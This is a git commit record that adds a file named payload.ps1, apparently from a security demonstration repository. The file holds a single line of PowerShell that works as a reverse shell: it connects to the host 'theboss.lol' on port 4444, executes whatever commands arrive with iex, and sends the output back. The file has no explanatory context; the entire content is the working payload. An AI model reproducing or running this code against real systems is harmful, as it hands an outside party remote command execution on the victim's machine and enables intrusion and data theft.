782d98548aea56c8a280815de7aec4b79fc5d060
davidbombal <davidbombal@gmail.com>
2020-10-27 12:33:24 +0200

    Create payload.ps1

---
+++ payload.ps1
@@ -0,0 +1,1 @@
+$sm=(New-Object Net.Sockets.TCPClient('theboss.lol',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
